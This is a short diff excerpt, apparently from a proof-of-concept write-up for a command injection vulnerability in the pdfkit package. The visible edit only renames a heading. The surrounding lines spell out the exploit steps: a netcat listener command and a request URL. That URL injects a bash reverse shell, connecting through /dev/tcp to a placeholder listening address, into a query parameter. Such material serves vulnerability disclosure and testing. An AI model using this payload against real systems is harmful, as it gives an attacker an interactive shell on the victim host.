@@ -17,7 +17,7 @@ The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL 
 <pre>
 2- nc -lnvp 'Target Port'
 </pre>
-### Make a request with CURL
+### Make a request 
 <pre>
 3- http://"TARGET_ADDRESS:Target PORT"//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/"Target_ADRESS/LISTENING_PORT"<&1'`'}
 </pre>
